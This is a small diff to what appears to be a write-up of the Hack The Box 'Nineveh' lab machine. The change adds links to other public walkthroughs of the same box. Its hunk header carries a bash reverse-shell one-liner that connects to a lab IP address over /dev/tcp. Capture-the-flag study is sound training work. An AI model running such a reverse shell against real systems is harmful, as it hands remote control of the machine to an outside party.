@@ -202,4 +202,5 @@ bash -i >& /dev/tcp/10.10.14.18/5555 0>&1
 # References & Alternatives:
 + https://vvmlist.github.io/#nineveh
 + https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
-+ 
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit
++ https://benheater.com/hackthebox-nineveh/
